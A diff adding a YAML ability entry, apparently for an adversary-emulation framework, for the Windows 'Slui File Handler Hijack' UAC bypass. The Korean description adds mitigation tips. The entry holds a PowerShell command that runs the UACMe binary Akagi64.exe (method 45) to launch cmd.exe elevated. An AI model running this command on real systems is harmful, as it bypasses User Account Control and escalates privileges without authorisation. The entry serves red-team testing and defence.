@@ -1,0 +1,14 @@
+- id: b7344901-0b02-4ead-baf6-e3f629ed545f
+  description: Slui File Handler Hijack은 Windows에서 Slui.exe 파일 핸들러를 하이재킹해 악성 파일을 실행, UAC를 우회하여 권한을 상승시키는 공격입니다. 이를 방지하려면 UAC 설정을 강화하고, 애플리케이션 실행을 화이트리스트로 제한하며, 레지스트리와 PowerShell 스크립트 실행을 모니터링해야 합니다.
+  name: Slui File Handler Hijack
+  platforms:
+    windows:
+      psh:
+        command: |
+          .\Akagi64.exe 45 C:\Windows\System32\cmd.exe
+        payloads:
+        - Akagi64.exe
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: "Abuse Elevation Control Mechanism: Bypass User Access Control"
